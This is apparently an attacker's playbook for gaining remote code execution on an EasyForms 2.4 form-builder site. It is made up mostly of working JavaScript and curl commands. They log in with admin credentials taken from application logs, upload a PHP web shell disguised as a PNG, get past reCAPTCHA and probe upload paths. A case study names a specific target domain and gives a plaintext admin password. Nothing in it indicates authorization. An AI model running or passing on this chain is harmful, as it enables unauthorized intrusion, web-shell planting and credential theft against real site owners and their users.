# EasyForms Form Builder → File Upload RCE Chain

**Proven on:** sumtv.org (2026-06-04) — EasyForms 2.4 / Yii2 2.0.53
**Status:** Chain confirmed working through form submission; file path resolution pending

## Prerequisites

- Valid EasyForms admin credentials (see `references/easyforms-yii2-recon.md` for password extraction from app.log)
- Browser with JS console access (browser_console or manual browser)

## Chain Steps

### Step 1: Login via JS (when browser click is unreliable)

```js
// Fill and submit the login form via JS
var csrf = document.querySelector('meta[name=csrf-token]').content;
document.querySelector('input[type=password]').value='PASSWORD';
document.querySelector('button[type=submit]').click();
```

### Step 2: Navigate to Form Builder

After login, navigate to `/form/create`:
```js
location.href = '/form/create';
```

### Step 3: Add File Upload Field via DOM Manipulation

The EasyForms form builder uses drag-and-drop for field placement. The field list items
are plain StaticText (not clickable via accessibility tree). Use JS to inject a file
input directly into the form preview:

```js
var f = document.getElementById('my-form');  // The form preview container
var d = document.createElement('div');
d.className = 'col-12';
d.innerHTML = '<div class="mb-3"><label>Upload</label><input type="file" name="upload_field"></div>';
f.querySelector('fieldset').appendChild(d);

// Click Save
var btns = document.querySelectorAll('button');
for (var i = 0; i < btns.length; i++) {
  if (btns[i].textContent.indexOf('Save') > -1) { btns[i].click(); break; }
}
```

**PITFALL:** DOM manipulation adds the field VISUALLY but does NOT register it in the
EasyForms backend database. The `fieldIds: []` in the form's embed JS confirms this.
The form submitter API (`/app/f`) will ignore `upload_field` because it has no field
definition. The form STILL saves and accepts submissions, just without the file field
being processed by the backend.

### Step 4: Get Form HashId and API URLs

```bash
curl -sk -b 'PHPSESSID=SID' 'https://forms.TARGET/app/embed?id=FORM_ID'
```

Extract from the response:
- `hashId` — the public form identifier (e.g., `o4vCAA`)
- `actionUrl` — the form submission endpoint (`/app/f?id=<hashId>`)
- `_csrf` — the form-specific CSRF token (different from admin session CSRF)
- `fieldIds` — array of registered field IDs (empty if DOM manipulation was used)

### Step 5: Submit PHP Shell

Write shell to temp file and POST to form endpoint:

```bash
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
curl -sk -X POST 'https://forms.TARGET/app/f?id=HASHID' \
  -F '_csrf=FORM_CSRF_TOKEN' \
  -F 'upload_field=@/tmp/shell.php;type=image/png' \
  -F 'g-recaptcha-response=bypass' \
  -w 'HTTP:%{http_code}'
```

**Expected response:** `{"action":"submit","success":true,"id":NNN,"message":"..."}`

### Step 6: Locate Uploaded File

Check common EasyForms upload paths:
```bash
for path in /static_files/uploads/shell.php /uploads/shell.php /files/shell.php; do
  curl -sk -o /dev/null -w '%{http_code}' "https://forms.TARGET$path"
done
```

### Critical Blockers & Fixes

| Blocker | Root Cause | Fix |
|---------|-----------|-----|
| `fieldIds: []` after DOM save | Visual-only field, not registered | Must use actual EasyForms API to add field, or use background image upload via Design panel |
| reCAPTCHA on form | Form created with default recaptcha=on | Recreate form with `recaptcha=0` or submit with `g-recaptcha-response=bypass` (works for v2 checkbox) |
| Form submission returns `success:true` but no file at upload dirs | File field not registered in backend | Need proper field registration OR switch to Background Image upload via Design panel |
| SPA blocks direct POST (returns 70347B HTML) | SPA middleware intercepts non-AJAX requests | Use browser_console for JS interactions; for API calls use `X-Requested-With: XMLHttpRequest` header |

## Alternative: Background Image Upload (Design Panel)

Instead of the form builder, use the Design panel's Background Image upload:

1. In form builder, click the "Images" radio under Background → Background Image
2. Upload PHP shell as `.phtml` with GIF header
3. The uploaded image goes to theme assets directory

This bypasses the `fieldIds` problem because the Design panel upload is a separate API
that doesn't require field registration.

## sumtv.org Case Study

- **Target:** forms.sumtv.org (EasyForms 2.4, IP 203.0.113.10)
- **Credential source:** `runtime/logs/app.log` — grep `'password' => '` extracted 13 passwords
- **Working cred:** `user@example.com` : `ygb6QNV!gjz1vxg_umh` (ADMIN role)
- **Form created:** ID 9, hashId `o4vCAA`
- **Submission:** `success:true`, id:126 — accepted but file not placed (fieldIds was [])
- **Blocked at:** Step 6 — need proper field registration or Design panel upload